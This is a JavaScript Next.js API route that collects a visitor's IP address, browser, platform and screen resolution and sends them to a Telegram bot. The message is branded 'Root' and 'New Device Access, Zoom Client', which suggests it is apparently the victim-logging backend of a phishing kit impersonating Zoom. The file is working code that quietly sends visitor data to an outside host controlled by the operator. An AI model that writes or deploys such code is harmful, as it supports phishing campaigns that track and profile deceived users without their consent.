import { NextResponse } from "next/server";

async function sendTelegramMessage(telegramUrl, payload, retries = 3, delay = 5000) {
  for (let i = 0; i < retries; i++) {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout

      const res = await fetch(telegramUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        signal: controller.signal,
      });

      clearTimeout(timeoutId);

      if (!res.ok) {
        throw new Error(`Telegram API Error: ${res.status} - ${await res.text()}`);
      }

      return await res.json();
    } catch (error) {
      console.error(`Retry ${i + 1}/${retries} failed:`, error);
      if (i < retries - 1) {
        await new Promise((resolve) => setTimeout(resolve, delay));
      }
    }
  }
  throw new Error("Failed to send message to Telegram after multiple attempts.");
}

export async function POST(req) {
  try {
    if (req.headers.get("content-type") !== "application/json") {
      return NextResponse.json({ error: "Invalid Content-Type" }, { status: 400 });
    }

    const body = await req.json();
    const { ip, browser, platform, screenWidth, screenHeight } = body;

    if (!ip || !browser || !platform) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 });
    }

    console.log("✅ Received device info:", body);

    const message = `🧛‍♂️ *Root*\n📢 *New Device Access*\n*Zoom Client*\n\n🌍 IP: ${ip}\n🖥 Platform: ${platform}\n🌐 Browser: ${browser}\n📏 Resolution: ${screenWidth}x${screenHeight}`;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    console.log("📡 Sending to Telegram...", { botToken, chatId });

    const data = await sendTelegramMessage(telegramUrl, { chat_id: chatId, text: message, parse_mode: "Markdown" });

    console.log("🔄 Telegram API Response:", data);

    return NextResponse.json({ success: true, message: "Device info sent to Telegram" }, { status: 200 });
  } catch (error) {
    console.error("❌ Error in Telegram route:", error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
